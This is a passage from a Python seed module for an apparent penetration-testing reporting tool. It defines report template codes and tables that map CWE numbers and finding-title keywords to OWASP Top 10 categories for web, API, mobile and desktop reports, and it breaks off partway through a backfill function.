"""
Comprehensive findings-library seed across every VAPT category supported by
this platform.  Run via the POST /api/findings-library/seed-defaults
endpoint (admin/senior only).

Two responsibilities:

  1. Ensure a ReportTemplate row exists for every category code so that
     FindingLibrary.template_id (NOT NULL) can be satisfied.  Templates
     that aren't backed by a .docx file are created with `is_active=False`
     so they don't appear in the report-creation drop-down.

  2. Insert ~8 representative findings per category covering the
     vulnerabilities consultants encounter most often.  Each finding gets
     the appropriate `template:<code>` tag set so the multi-template
     classification filter in the library UI shows them under the right
     scope.

The seeder is idempotent.  A finding is "the same" if its title already
exists in the database — we don't try to update the body, just skip.
That way it's safe to re-run after the library has been edited by users.

Each `description` / `impact` / `remediation` is written in lightweight
markdown.  The library detail modal renders it via the new safe markdown
renderer; the Word output goes through HTML-or-text detection so plain
markdown still surfaces as plain text in generated DOCX (which preserves
existing behaviour).
"""
from __future__ import annotations
from sqlalchemy.orm import Session

from .models import FindingLibrary, LibraryStatus, ReportTemplate, Severity
from .services.cwe_names import canonicalise as _canonical_cwe


# Templates we want to exist after seeding.  `docx_filename` may point at a
# file that doesn't exist yet — `is_active=False` keeps it out of the UI.
# Every entry in this list is treated as a system-available master
# template. The 4th column (`active`) is True for every type now —
# the boot-time `_regenerate_word_templates` hook ensures a docx file
# exists for each one (VibeDocs-derived where the source is bundled,
# simple-fallback otherwise), so flipping them all on is safe.
TEMPLATE_BOOTSTRAP = [
    ("web_vapt",           "Web Application VAPT",        "web_vapt_template.docx",       True),
    ("api_vapt",           "API Penetration Test",        "api_vapt_template.docx",       True),
    ("infra_vapt",         "Infrastructure VAPT",         "infra_vapt_template.docx",     True),
    ("infra_va",           "Infrastructure VA",           "infra_va_template.docx",       True),
    ("mobile_pt",          "Mobile Application PT",       "mobile_pt_template.docx",      True),
    ("thick_client_pt",    "Thick Client PT",             "thick_client_pt_template.docx",True),
    ("wifi_pt",            "Wi-Fi Penetration Test",      "wifi_pt_template.docx",        True),
    ("kiosk_pt",           "Kiosk Penetration Test",      "kiosk_pt_template.docx",       True),
    ("ot_vapt",            "OT / ICS VAPT",               "ot_vapt_template.docx",        True),
    ("aws_cloud_vapt",     "AWS Cloud VAPT",              "aws_cloud_vapt_template.docx", True),
    ("azure_cloud_vapt",   "Azure Cloud VAPT",            "azure_cloud_vapt_template.docx", True),
    ("source_code_review", "Source Code Review",          "source_code_review_template.docx", True),
]


def _sev(name: str) -> Severity:
    return Severity[name.lower()] if name.lower() in Severity.__members__ \
        else Severity(name.title())


# ============================================================
# OWASP Top 10 2025 — backfill helper
# ============================================================
#
# Maps a finding (by CWE first, then title keywords) to its OWASP Top
# 2025 category. Used to retroactively tag every web_vapt FindingLibrary
# row that the original seed inserted without `owasp_category`, so the
# VibeDocs tracker template's "OWASP Top 10" column is always populated.
#
# Format: "A0X:2025". The category list mirrors the OWASP Top 10 family
# (10 categories A01-A10) with the year label flipped to 2025. We keep
# the colon-year format because the existing schema already stores
# values like "A03:2021" and the tracker exporter pattern-matches on
# the leading "A0X" prefix anyway.

# CWE → OWASP-2025 category. Largest contributor families per the
# OWASP Top 10 mapping. Hand-curated to the CWEs actually used in this
# repo's seed file (full official list is much larger).
_CWE_TO_OWASP_2025: dict[str, str] = {
    # A01:2025 — Broken Access Control
    "CWE-22":   "A01:2025", "CWE-23": "A01:2025", "CWE-35": "A01:2025",
    "CWE-200":  "A01:2025", "CWE-201": "A01:2025",
    "CWE-264":  "A01:2025", "CWE-275": "A01:2025", "CWE-276": "A01:2025",
    "CWE-284":  "A01:2025", "CWE-285": "A01:2025",
    "CWE-352":  "A01:2025",
    "CWE-425":  "A01:2025",
    "CWE-538":  "A01:2025", "CWE-540": "A01:2025", "CWE-548": "A01:2025",
    "CWE-552":  "A01:2025", "CWE-566": "A01:2025",
    "CWE-601":  "A01:2025",
    "CWE-639":  "A01:2025", "CWE-651": "A01:2025",
    "CWE-862":  "A01:2025", "CWE-863": "A01:2025",
    "CWE-913":  "A01:2025", "CWE-922": "A01:2025",

    # A02:2025 — Cryptographic Failures
    "CWE-261":  "A02:2025", "CWE-296": "A02:2025", "CWE-310": "A02:2025",
    "CWE-319":  "A02:2025", "CWE-321": "A02:2025", "CWE-322": "A02:2025",
    "CWE-323":  "A02:2025", "CWE-324": "A02:2025", "CWE-325": "A02:2025",
    "CWE-326":  "A02:2025", "CWE-327": "A02:2025", "CWE-328": "A02:2025",
    "CWE-329":  "A02:2025", "CWE-330": "A02:2025", "CWE-331": "A02:2025",
    "CWE-335":  "A02:2025", "CWE-336": "A02:2025", "CWE-337": "A02:2025",
    "CWE-338":  "A02:2025", "CWE-347": "A02:2025",
    "CWE-523":  "A02:2025", "CWE-598": "A02:2025",
    "CWE-720":  "A02:2025", "CWE-757": "A02:2025",
    "CWE-916":  "A02:2025",

    # A03:2025 — Injection (includes XSS)
    "CWE-20":   "A03:2025", "CWE-74":  "A03:2025", "CWE-75":  "A03:2025",
    "CWE-77":   "A03:2025", "CWE-78":  "A03:2025", "CWE-79":  "A03:2025",
    "CWE-80":   "A03:2025", "CWE-83":  "A03:2025", "CWE-87":  "A03:2025",
    "CWE-88":   "A03:2025", "CWE-89":  "A03:2025", "CWE-90":  "A03:2025",
    "CWE-91":   "A03:2025", "CWE-93":  "A03:2025", "CWE-94":  "A03:2025",
    "CWE-95":   "A03:2025", "CWE-96":  "A03:2025", "CWE-97":  "A03:2025",
    "CWE-98":   "A03:2025", "CWE-99":  "A03:2025",
    "CWE-113":  "A03:2025", "CWE-116": "A03:2025",
    "CWE-470":  "A03:2025", "CWE-471": "A03:2025",
    "CWE-564":  "A03:2025", "CWE-643": "A03:2025", "CWE-644": "A03:2025",
    "CWE-652":  "A03:2025", "CWE-917": "A03:2025",
    "CWE-611":  "A03:2025",          # XXE
    "CWE-1336": "A03:2025",          # SSTI

    # Additional commonly-seen CWEs missing from the table above
    "CWE-272":  "A01:2025",          # Least Privilege Violation
    "CWE-615":  "A02:2025",          # Info disclosure via comments
    "CWE-770":  "A04:2025",          # Resource exhaustion / no pagination
    "CWE-534":  "A09:2025",          # Debug logs
    "CWE-632":  "A01:2025",          # LFI (path traversal-like)
    "CWE-138":  "A03:2025",          # Improper neutralization (Excel formula injection)

    # A04:2025 — Insecure Design
    "CWE-209":  "A04:2025", "CWE-256": "A04:2025", "CWE-257": "A04:2025",
    "CWE-269":  "A04:2025", "CWE-311": "A04:2025", "CWE-312": "A04:2025",
    "CWE-313":  "A04:2025", "CWE-316": "A04:2025",
    "CWE-419":  "A04:2025", "CWE-434": "A04:2025", "CWE-444": "A04:2025",
    "CWE-451":  "A04:2025", "CWE-501": "A04:2025", "CWE-522": "A04:2025",
    "CWE-525":  "A04:2025", "CWE-602": "A04:2025", "CWE-642": "A04:2025",
    "CWE-840":  "A04:2025", "CWE-841": "A04:2025",
    "CWE-1173": "A04:2025",
    "CWE-362":  "A04:2025",          # TOCTOU

    # A05:2025 — Security Misconfiguration
    "CWE-2":    "A05:2025", "CWE-11":  "A05:2025", "CWE-13":  "A05:2025",
    "CWE-15":   "A05:2025", "CWE-16":  "A05:2025", "CWE-260": "A05:2025",
    "CWE-315":  "A05:2025", "CWE-520": "A05:2025", "CWE-526": "A05:2025",
    "CWE-537":  "A05:2025", "CWE-541": "A05:2025", "CWE-547": "A05:2025",
    "CWE-614":  "A05:2025", "CWE-693": "A05:2025", "CWE-756": "A05:2025",
    "CWE-776":  "A05:2025", "CWE-942": "A05:2025",
    "CWE-1004": "A05:2025", "CWE-1021": "A05:2025",
    "CWE-1174": "A05:2025",

    # A06:2025 — Vulnerable and Outdated Components
    "CWE-937":  "A06:2025", "CWE-1035": "A06:2025", "CWE-1104": "A06:2025",

    # A07:2025 — Identification and Authentication Failures
    "CWE-204":  "A07:2025", "CWE-255": "A07:2025", "CWE-259": "A07:2025",
    "CWE-287":  "A07:2025", "CWE-288": "A07:2025", "CWE-290": "A07:2025",
    "CWE-294":  "A07:2025", "CWE-295": "A07:2025", "CWE-297": "A07:2025",
    "CWE-300":  "A07:2025", "CWE-302": "A07:2025", "CWE-304": "A07:2025",
    "CWE-306":  "A07:2025", "CWE-307": "A07:2025", "CWE-346": "A07:2025",
    "CWE-384":  "A07:2025", "CWE-521": "A07:2025", "CWE-613": "A07:2025",
    "CWE-620":  "A07:2025", "CWE-640": "A07:2025", "CWE-798": "A07:2025",

    # A08:2025 — Software and Data Integrity Failures
    "CWE-345":  "A08:2025", "CWE-353": "A08:2025", "CWE-426": "A08:2025",
    "CWE-494":  "A08:2025", "CWE-502": "A08:2025", "CWE-565": "A08:2025",
    "CWE-784":  "A08:2025", "CWE-829": "A08:2025", "CWE-830": "A08:2025",
    "CWE-915":  "A08:2025",

    # A09:2025 — Security Logging and Monitoring Failures
    "CWE-117":  "A09:2025", "CWE-223": "A09:2025", "CWE-532": "A09:2025",
    "CWE-778":  "A09:2025",

    # A10:2025 — Server-Side Request Forgery
    "CWE-918":  "A10:2025",
}

# Title-keyword fallback when CWE is missing or ambiguous. Each entry
# is checked in order — first match wins. Used for findings whose CWE
# isn't in the table above (e.g. EOL software detections that don't
# carry a CVE-style CWE).
_TITLE_TO_OWASP_2025: list[tuple[str, str]] = [
    # A01 — access control
    ("idor",                            "A01:2025"),
    ("broken access",                   "A01:2025"),
    ("forced browsing",                 "A01:2025"),
    ("csrf",                            "A01:2025"),
    ("cross-site request forgery",      "A01:2025"),
    ("open redirect",                   "A01:2025"),
    ("path traversal",                  "A01:2025"),
    ("directory traversal",             "A01:2025"),
    ("mass assignment",                 "A01:2025"),
    # A02 — crypto / sensitive data
    ("sensitive data",                  "A02:2025"),
    ("email address",                   "A02:2025"),
    ("get url",                         "A02:2025"),
    ("get query",                       "A02:2025"),
    ("plaintext",                       "A02:2025"),
    ("cleartext",                       "A02:2025"),
    ("weak cipher",                     "A02:2025"),
    ("ssl ",                            "A02:2025"),
    ("tls ",                            "A02:2025"),
    # A03 — injection / XSS
    ("xss",                             "A03:2025"),
    ("cross-site scripting",            "A03:2025"),
    ("sql injection",                   "A03:2025"),
    ("command injection",               "A03:2025"),
    ("ldap injection",                  "A03:2025"),
    ("xml injection",                   "A03:2025"),
    ("xxe",                             "A03:2025"),
    ("xpath injection",                 "A03:2025"),
    ("crlf injection",                  "A03:2025"),
    ("template injection",              "A03:2025"),
    ("ssti",                            "A03:2025"),
    ("host header injection",           "A03:2025"),
    ("response splitting",              "A03:2025"),
    ("nosql injection",                 "A03:2025"),
    ("parameter pollution",             "A03:2025"),
    # A04 — insecure design
    ("verbose error",                   "A04:2025"),
    ("stack-trace",                     "A04:2025"),
    ("stack trace",                     "A04:2025"),
    ("race condition",                  "A04:2025"),
    ("toctou",                          "A04:2025"),
    ("file upload",                     "A04:2025"),
    ("unrestricted file",               "A04:2025"),
    # A05 — security misconfiguration
    ("clickjacking",                    "A05:2025"),
    ("frame protection",                "A05:2025"),
    ("missing security header",         "A05:2025"),
    ("missing or misconfigured",        "A05:2025"),
    ("security header",                 "A05:2025"),
    ("secure flag",                     "A05:2025"),
    ("samesite",                        "A05:2025"),
    ("cors",                            "A05:2025"),
    ("directory listing",               "A05:2025"),
    ("backup",                          "A05:2025"),
    ("banner disclosure",               "A05:2025"),
    ("cache",                           "A05:2025"),
    # A06 — vulnerable components
    ("known vulnerabilit",              "A06:2025"),
    ("outdated",                        "A06:2025"),
    ("end of life",                     "A06:2025"),
    ("end-of-life",                     "A06:2025"),
    ("unsupported version",             "A06:2025"),
    ("deprecated",                      "A06:2025"),
    # Additional keyword rules covering the remaining untagged rows
    ("account lockout",                 "A07:2025"),
    ("logout on device",                "A07:2025"),
    ("lock screen",                     "A07:2025"),
    ("device lock",                     "A07:2025"),
    ("session invalidation",            "A07:2025"),
    ("cookie expiration",               "A07:2025"),
    ("weak hashing",                    "A02:2025"),
    ("hashing algorithm",               "A02:2025"),
    ("wpa-",                            "A02:2025"),
    ("encryption on wireless",          "A02:2025"),
    ("app transport security",          "A02:2025"),
    ("ikev1",                           "A02:2025"),
    ("development information",         "A04:2025"),
    ("debug logs",                      "A09:2025"),
    ("debugging enabled",               "A09:2025"),
    ("source code comments",            "A02:2025"),
    ("anti-virus",                      "A05:2025"),
    ("anti-hooking",                    "A04:2025"),
    ("root detection",                  "A04:2025"),
    ("certificate pinning",             "A02:2025"),
    ("ntp",                             "A05:2025"),
    ("svn",                             "A05:2025"),
    ("web-inf",                         "A05:2025"),
    ("custom error page",               "A04:2025"),
    ("excel formula",                   "A03:2025"),
    ("local file inclusion",            "A01:2025"),
    ("least privilege",                 "A01:2025"),
    ("managed identity",                "A01:2025"),
    ("permission protection",           "A01:2025"),
    ("pagination",                      "A04:2025"),
    ("password policy",                 "A07:2025"),
    ("terminal services",               "A05:2025"),
    ("host header",                     "A03:2025"),
    ("internal ip",                     "A02:2025"),
    ("ip address.*disclosure",          "A02:2025"),
    ("port disclosure",                 "A02:2025"),
    ("hostname.*information",           "A02:2025"),
    ("hostname information",            "A02:2025"),
    ("uat environment",                 "A05:2025"),
    ("cordova log",                     "A09:2025"),
    ("terms of use",                    "A05:2025"),
    # A07 — auth failures
    ("session fixation",                "A07:2025"),
    ("session expir",                   "A07:2025"),
    ("session timeout",                 "A07:2025"),
    ("session token",                   "A07:2025"),
    ("idle timeout",                    "A07:2025"),
    ("session cookie",                  "A07:2025"),
    ("multiple login",                  "A07:2025"),
    ("concurrent login",                "A07:2025"),
    ("multiple sessions",               "A07:2025"),
    ("default credentials",             "A07:2025"),
    ("default password",                "A07:2025"),
    ("weak password",                   "A07:2025"),
    ("weak / missing captcha",          "A07:2025"),
    ("captcha",                         "A07:2025"),
    ("brute",                           "A07:2025"),
    ("rate limit",                      "A07:2025"),
    ("username enumeration",            "A07:2025"),
    ("account enumeration",             "A07:2025"),
    ("jwt",                             "A07:2025"),
    ("oauth",                           "A07:2025"),
    ("saml",                            "A07:2025"),
    # A08 — integrity failures
    ("deserialization",                 "A08:2025"),
    ("deserialisation",                 "A08:2025"),
    ("subresource integrity",           "A08:2025"),
    ("sri ",                            "A08:2025"),
    ("supply chain",                    "A08:2025"),
    ("subdomain takeover",              "A08:2025"),
    # A09 — logging failures
    ("logging",                         "A09:2025"),
    ("audit",                           "A09:2025"),
    ("data in application logs",        "A09:2025"),
    # A10 — SSRF
    ("ssrf",                            "A10:2025"),
    ("server-side request forgery",     "A10:2025"),
    # Catch-all for header smuggling-style flaws
    ("smuggling",                       "A05:2025"),
    ("websocket",                       "A01:2025"),
]


def _infer_owasp_2025(cwe: str, title: str) -> str:
    """Return the best-guess OWASP-2025 category for a finding, or ""
    if no signal matched. CWE first (most reliable), then title keyword.
    """
    # CWE values stored on FindingLibrary rows are in canonical form
    # ("CWE-79 (Improper Neutralization...)"). Extract just the prefix.
    if cwe:
        import re
        m = re.match(r"(CWE-\d+)", cwe.strip(), re.IGNORECASE)
        if m:
            key = m.group(1).upper()
            if key in _CWE_TO_OWASP_2025:
                return _CWE_TO_OWASP_2025[key]
    t = (title or "").lower()
    for needle, cat in _TITLE_TO_OWASP_2025:
        if needle in t:
            return cat
    return ""


# Templates that use their own OWASP taxonomy (not OWASP Top 10 Web).
# Their findings must NOT be rewritten by backfill_owasp_top10_2025.
_TEMPLATE_SPECIFIC_OWASP_CODES = {"api_vapt", "mobile_pt", "thick_client_pt"}


def backfill_owasp_top10_2025(db) -> int:
    """Set ``owasp_category`` to the OWASP Top 10 2025 category on every
    FindingLibrary row that is currently missing one (or carrying a
    pre-2025 label). Inference uses CWE first, title keywords second.

    Returns the number of rows updated. Caller commits.

    Idempotent — re-running is a no-op once every row has an
    "A0X:2025" value. Rows whose CWE/title don't match any rule are
    left unchanged so the consultant can hand-edit them via the
    library admin UI.

    Why we also rewrite "A0X:2021" → "A0X:2025": the user wants the
    library + the VibeDocs tracker template's "OWASP Top 10" column to
    consistently reflect the 2025 edition. Old 2021-labelled rows would
    otherwise show up next to new 2025 rows and confuse the export.

    IMPORTANT: Findings whose primary template uses a different OWASP
    taxonomy (api_vapt → OWASP API 2023, mobile_pt → OWASP Mobile 2024,
    thick_client_pt → Desktop App 2021) are skipped entirely so that
    backfill_template_specific_owasp() can manage them separately.
    """
    from .models import FindingLibrary, ReportTemplate
    updated = 0
    rows = (
        db.query(FindingLibrary)
        .join(ReportTemplate, FindingLibrary.template_id == ReportTemplate.id)
        .filter(ReportTemplate.code.notin_(_TEMPLATE_SPECIFIC_OWASP_CODES))
        .all()
    )
    # Repair pass for any row carrying a malformed value like "0A1:2025"
    # (left behind by a previous buggy normalisation regex). We strip
    # the leading "0" so the AX pattern below matches and rewrites
    # cleanly to "A01:2025".
    import re as _re_pre
    for r in rows:
        cur = (r.owasp_category or "").strip()
        m = _re_pre.match(r"0+(A\d{1,2}:.*)$", cur, _re_pre.IGNORECASE)
        if m:
            r.owasp_category = m.group(1)
    for r in rows:
        current = (r.owasp_category or "").strip()
        # `current` may have been mutated by the repair pass above.
        # The "endswith(:2025) AND matches A0X" check ensures malformed
        # leftover values like "0A1:2025" are reprocessed in the
        # rewrite branch below instead of being silently skipped.
        if current.endswith(":2025") and _re_pre.match(r"A(0[1-9]|10):2025$", current):
            continue
        # Rewrite "A0X:2021" (or any non-2025 label) to "A0X:2025"
        # while preserving the category number. Normalises "A1" → "A01"
        # so every row lands in the canonical "A0X:2025" / "A10:2025"
        # form. If the prefix doesn't match the AX pattern at all we
        # fall through to fresh inference.
        if current:
            import re
            m = re.match(r"A0*(\d{1,2})", current, re.IGNORECASE)
            if m:
                num = int(m.group(1))
                if 1 <= num <= 10:
                    r.owasp_category = f"A{num:02d}:2025"
                    updated += 1
                    continue
        inferred = _infer_owasp_2025(r.cwe or "", r.title or "")
        if inferred:
            r.owasp_category = inferred
            updated += 1
    return updated


# ── OWASP API Security Top 10 2023 ────────────────────────────────────────
# CWE → OWASP API 2023 category mapping. Covers the CWEs used in this
# repo's api_vapt seed findings. The official full list is larger; this
# table focuses on what actually appears in the library.
_CWE_TO_API_2023: dict[str, str] = {
    # API1 — Broken Object Level Authorization
    "CWE-639": "API1:2023", "CWE-284": "API1:2023", "CWE-285": "API1:2023",
    "CWE-862": "API1:2023", "CWE-863": "API1:2023",
    # API2 — Broken Authentication
    "CWE-287": "API2:2023", "CWE-347": "API2:2023", "CWE-384": "API2:2023",
    "CWE-295": "API2:2023", "CWE-306": "API2:2023", "CWE-613": "API2:2023",
    "CWE-521": "API2:2023", "CWE-307": "API2:2023", "CWE-798": "API2:2023",
    # API3 — Broken Object Property Level Authorization (Excessive Data Exposure)
    "CWE-213": "API3:2023", "CWE-200": "API3:2023", "CWE-201": "API3:2023",
    "CWE-359": "API3:2023",
    # API4 — Unrestricted Resource Consumption
    "CWE-770": "API4:2023", "CWE-400": "API4:2023", "CWE-799": "API4:2023",
    # API5 — Broken Function Level Authorization
    "CWE-269": "API5:2023", "CWE-276": "API5:2023",
    # API6 — Unrestricted Access to Sensitive Business Flows / Mass Assignment
    "CWE-915": "API6:2023", "CWE-641": "API6:2023",
    # API7 — Server Side Request Forgery
    "CWE-918": "API7:2023",
    # API8 — Security Misconfiguration
    "CWE-942": "API8:2023", "CWE-693": "API8:2023", "CWE-1021": "API8:2023",
    "CWE-611": "API8:2023", "CWE-16": "API8:2023",
    # API9 — Improper Inventory Management
    "CWE-1104": "API9:2023", "CWE-937": "API9:2023",
    # API10 — Unsafe Consumption of APIs
    "CWE-346": "API10:2023", "CWE-20": "API10:2023",
}

# Title-keyword fallback for API findings.
_TITLE_TO_API_2023: list[tuple[str, str]] = [
    ("broken object level",             "API1:2023"),
    ("bola",                            "API1:2023"),
    ("idor",                            "API1:2023"),
    ("broken authentication",           "API2:2023"),
    ("jwt",                             "API2:2023"),
    ("token",                           "API2:2023"),
    ("excessive data exposure",         "API3:2023"),
    ("data exposure",                   "API3:2023"),
    ("graphql introspection",           "API3:2023"),
    ("rate limit",                      "API4:2023"),
    ("pagination",                      "API4:2023"),
    ("resource consumption",            "API4:2023"),
    ("bulk endpoint",                   "API4:2023"),
    ("mass / bulk",                     "API4:2023"),
    ("broken function level",           "API5:2023"),
    ("bfla",                            "API5:2023"),
    ("function level authorization",    "API5:2023"),
    ("mass assignment",                 "API6:2023"),
    ("unrestricted access",             "API6:2023"),
    ("ssrf",                            "API7:2023"),
    ("server-side request forgery",     "API7:2023"),
    ("server side request forgery",     "API7:2023"),
    ("cors",                            "API8:2023"),
    ("xxe",                             "API8:2023"),
    ("xml external entity",             "API8:2023"),
    ("security misconfiguration",       "API8:2023"),
    ("introspection",                   "API8:2023"),
    ("versioning",                      "API9:2023"),
    ("old endpoint",                    "API9:2023"),
    ("inventory",                       "API9:2023"),
    ("outdated",                        "API9:2023"),
    ("third-party api",                 "API10:2023"),
    ("third party api",                 "API10:2023"),
    ("unsafe consumption",              "API10:2023"),
]


# ── OWASP Mobile Top 10 2024 ──────────────────────────────────────────────
_CWE_TO_MOBILE_2024: dict[str, str] = {
    # M1 — Improper Credential Usage
    "CWE-798": "M1:2024", "CWE-259": "M1:2024", "CWE-321": "M1:2024",
    # M2 — Inadequate Supply Chain Security
    "CWE-494": "M2:2024", "CWE-829": "M2:2024",
    # M3 — Insecure Authentication/Authorization
    "CWE-287": "M3:2024", "CWE-306": "M3:2024", "CWE-613": "M3:2024",
    "CWE-384": "M3:2024", "CWE-639": "M3:2024", "CWE-285": "M3:2024",
    "CWE-276": "M3:2024",
    # M4 — Insufficient Input/Output Validation
    "CWE-20": "M4:2024", "CWE-749": "M4:2024", "CWE-79": "M4:2024",
    "CWE-927": "M4:2024", "CWE-926": "M4:2024",
    # M5 — Insecure Communication
    "CWE-295": "M5:2024", "CWE-296": "M5:2024", "CWE-297": "M5:2024",
    "CWE-319": "M5:2024", "CWE-326": "M5:2024",
    # M6 — Inadequate Privacy Controls
    "CWE-200": "M6:2024", "CWE-359": "M6:2024", "CWE-201": "M6:2024",
    # M7 — Insufficient Binary Protections
    "CWE-693": "M7:2024", "CWE-656": "M7:2024", "CWE-926": "M7:2024",
    # M8 — Security Misconfiguration
    "CWE-1004": "M8:2024", "CWE-942": "M8:2024", "CWE-16": "M8:2024",
    "CWE-489": "M8:2024", "CWE-532": "M8:2024",
    # M9 — Insecure Data Storage
    "CWE-312": "M9:2024", "CWE-313": "M9:2024", "CWE-316": "M9:2024",
    "CWE-922": "M9:2024", "CWE-538": "M9:2024", "CWE-540": "M9:2024",
    # M10 — Insufficient Cryptography
    "CWE-310": "M10:2024", "CWE-327": "M10:2024", "CWE-328": "M10:2024",
    "CWE-338": "M10:2024",
}

_TITLE_TO_MOBILE_2024: list[tuple[str, str]] = [
    ("hardcoded api key",               "M1:2024"),
    ("hardcoded credential",            "M1:2024"),
    ("hardcoded key",                   "M1:2024"),
    ("biometric authentication",        "M3:2024"),
    ("authentication",                  "M3:2024"),
    ("logout",                          "M3:2024"),
    ("direct object reference",         "M3:2024"),
    ("webview",                         "M4:2024"),
    ("tapjacking",                      "M4:2024"),
    ("deep link",                       "M4:2024"),
    ("url scheme",                      "M4:2024"),
    ("input validation",                "M4:2024"),
    ("third party content",             "M4:2024"),
    ("certificate pinning",             "M5:2024"),
    ("app transport security",          "M5:2024"),
    ("ssl",                             "M5:2024"),
    ("tls",                             "M5:2024"),
    ("pinning",                         "M5:2024"),
    ("screenshot",                      "M6:2024"),
    ("clipboard",                       "M6:2024"),
    ("task switcher",                   "M6:2024"),
    ("app-switcher",                    "M6:2024"),
    ("privacy",                         "M6:2024"),
    ("backgrounded",                    "M6:2024"),
    ("obfuscated",                      "M6:2024"),
    ("code obfuscation",                "M7:2024"),
    ("anti-tampering",                  "M7:2024"),
    ("anti-hooking",                    "M7:2024"),
    ("anti-debugging",                  "M7:2024"),
    ("root detection",                  "M7:2024"),
    ("jailbreak detection",             "M7:2024"),
    ("jailbreak",                       "M7:2024"),
    ("emulator detection",              "M7:2024"),
    ("binary protection",               "M7:2024"),
    ("debug build",                     "M8:2024"),
    ("debuggable",                      "M8:2024"),
    ("allowbackup",                     "M8:2024"),
    ("android:allowbackup",             "M8:2024"),
    ("minimum sdk",                     "M8:2024"),
    ("development information",         "M8:2024"),
    ("permission protection",           "M8:2024"),
    ("exported",                        "M8:2024"),
    ("file path",                       "M8:2024"),
    ("sensitive data in app log",       "M9:2024"),
    ("data in log",                     "M9:2024"),
    ("logcat",                          "M9:2024"),
    ("shared preferences",              "M9:2024"),
    ("sqlite",                          "M9:2024"),
    ("external storage",                "M9:2024"),
    ("insecure data storage",           "M9:2024"),
    ("insecure local",                  "M9:2024"),
    ("sensitive data written",          "M9:2024"),
]


# ── OWASP Desktop App Security Top 10 2021 ────────────────────────────────
_CWE_TO_DESKTOP_2021: dict[str, str] = {
    # DA1 — Injections
    "CWE-89": "DA1:2021", "CWE-78": "DA1:2021", "CWE-77": "DA1:2021",
    "CWE-134": "DA1:2021", "CWE-138": "DA1:2021",
    # DA2 — Broken Authentication & Session Management
    "CWE-287": "DA2:2021", "CWE-306": "DA2:2021", "CWE-384": "DA2:2021",
    "CWE-613": "DA2:2021",
    # DA3 — Sensitive Data Exposure
    "CWE-312": "DA3:2021", "CWE-316": "DA3:2021", "CWE-256": "DA3:2021",
    "CWE-798": "DA3:2021", "CWE-244": "DA3:2021", "CWE-200": "DA3:2021",
    # DA4 — Improper Cryptography Usage
    "CWE-326": "DA4:2021", "CWE-327": "DA4:2021", "CWE-321": "DA4:2021",
    "CWE-494": "DA4:2021", "CWE-347": "DA4:2021",
    # DA5 — Improper Authorization
    "CWE-269": "DA5:2021", "CWE-285": "DA5:2021", "CWE-602": "DA5:2021",
    "CWE-276": "DA5:2021",
    # DA6 — Security Misconfiguration
    "CWE-16": "DA6:2021", "CWE-693": "DA6:2021",
    # DA7 — Insecure Communication
    "CWE-319": "DA7:2021", "CWE-295": "DA7:2021",
    # DA8 — Poor Code Quality
    "CWE-427": "DA8:2021", "CWE-1035": "DA8:2021", "CWE-1188": "DA8:2021",
    "CWE-119": "DA8:2021", "CWE-120": "DA8:2021", "CWE-122": "DA8:2021",
    "CWE-787": "DA8:2021",
    # DA9 — Using Components with Known Vulnerabilities
    "CWE-1104": "DA9:2021", "CWE-937": "DA9:2021",
    # DA10 — Insufficient Logging & Monitoring
    "CWE-532": "DA10:2021", "CWE-223": "DA10:2021", "CWE-778": "DA10:2021",
}

_TITLE_TO_DESKTOP_2021: list[tuple[str, str]] = [
    ("sql injection",                   "DA1:2021"),
    ("command injection",               "DA1:2021"),
    ("format string",                   "DA1:2021"),
    ("buffer overflow",                 "DA1:2021"),
    ("injection",                       "DA1:2021"),
    ("hardcoded credential",            "DA3:2021"),
    ("hardcoded database",              "DA3:2021"),
    ("hardcoded api key",               "DA3:2021"),
    ("sensitive data in process",       "DA3:2021"),
    ("sensitive data in windows",       "DA3:2021"),
    ("sensitive data in registry",      "DA3:2021"),
    ("sensitive memory",                "DA3:2021"),
    ("encryption using hardcoded",      "DA4:2021"),
    ("hardcoded key",                   "DA4:2021"),
    ("insecure update",                 "DA4:2021"),
    ("code-signing",                    "DA4:2021"),
    ("code signing",                    "DA4:2021"),
    ("binary not code-signed",          "DA4:2021"),
    ("client-side validation",          "DA5:2021"),
    ("dll hijacking",                   "DA8:2021"),
    ("dll loading",                     "DA8:2021"),
    ("insecure dll",                    "DA8:2021"),
    ("verbose log",                     "DA10:2021"),
    ("excessive log",                   "DA10:2021"),
    ("log file",                        "DA10:2021"),
]


def _infer_api_2023(cwe: str, title: str) -> str:
    """Return the best OWASP API 2023 category or "" if no match."""
    import re
    if cwe:
        m = re.match(r"(CWE-\d+)", cwe.strip(), re.IGNORECASE)
        if m:
            key = m.group(1).upper()
            if key in _CWE_TO_API_2023:
                return _CWE_TO_API_2023[key]
    t = (title or "").lower()
    for needle, cat in _TITLE_TO_API_2023:
        if needle in t:
            return cat
    return ""


def _infer_mobile_2024(cwe: str, title: str) -> str:
    """Return the best OWASP Mobile 2024 category or "" if no match."""
    import re
    if cwe:
        m = re.match(r"(CWE-\d+)", cwe.strip(), re.IGNORECASE)
        if m:
            key = m.group(1).upper()
            if key in _CWE_TO_MOBILE_2024:
                return _CWE_TO_MOBILE_2024[key]
    t = (title or "").lower()
    for needle, cat in _TITLE_TO_MOBILE_2024:
        if needle in t:
            return cat
    return ""


def _infer_desktop_2021(cwe: str, title: str) -> str:
    """Return the best Desktop App 2021 category or "" if no match."""
    import re
    if cwe:
        m = re.match(r"(CWE-\d+)", cwe.strip(), re.IGNORECASE)
        if m:
            key = m.group(1).upper()
            if key in _CWE_TO_DESKTOP_2021:
                return _CWE_TO_DESKTOP_2021[key]
    t = (title or "").lower()
    for needle, cat in _TITLE_TO_DESKTOP_2021:
        if needle in t:
            return cat
    return ""


def backfill_template_specific_owasp(db) -> int:
    """Assign the correct OWASP taxonomy to api_vapt, mobile_pt, and
    thick_client_pt library findings.

      * api_vapt     → OWASP API Security Top 10 2023 (API1:2023 … API10:2023)
      * mobile_pt    → OWASP Mobile Top 10 2024      (M1:2024  … M10:2024)
      * thick_client_pt → OWASP Desktop App 2021     (DA1:2021 … DA10:2021)

    Returns the number of rows updated. Caller commits.
    Idempotent: rows already carrying the correct-format category are
    skipped (prefix doesn't change). Rows whose CWE/title produce no
    match are left unchanged.
    """
    import re as _re
    from .models import FindingLibrary, ReportTemplate
    updated = 0

    _VALID_API    = _re.compile(r"^API\d{1,2}:2023$",  _re.IGNORECASE)
    _VALID_MOBILE = _re.compile(r"^M\d{1,2}:2024$",    _re.IGNORECASE)
    _VALID_DA     = _re.compile(r"^DA\d{1,2}:2021$",   _re.IGNORECASE)

    rows = (
        db.query(FindingLibrary)
        .join(ReportTemplate, FindingLibrary.template_id == ReportTemplate.id)
